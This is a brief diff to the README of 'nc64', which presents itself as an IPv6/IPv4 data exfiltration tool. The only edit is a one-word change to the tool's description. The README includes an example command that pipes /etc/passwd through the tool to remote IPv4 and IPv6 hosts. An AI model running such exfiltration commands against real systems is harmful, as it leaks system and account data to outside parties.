@@ -1,5 +1,5 @@
 # nc64
-IPv6 and IPv4 session based data exfiltration tool
+IPv6 and IPv4 session based information exfiltration tool
 
 # Examples:
 cat /etc/passwd | python3 nc64.py -h4 192.168.10.10 -h6 2a02:1010:12aa::11
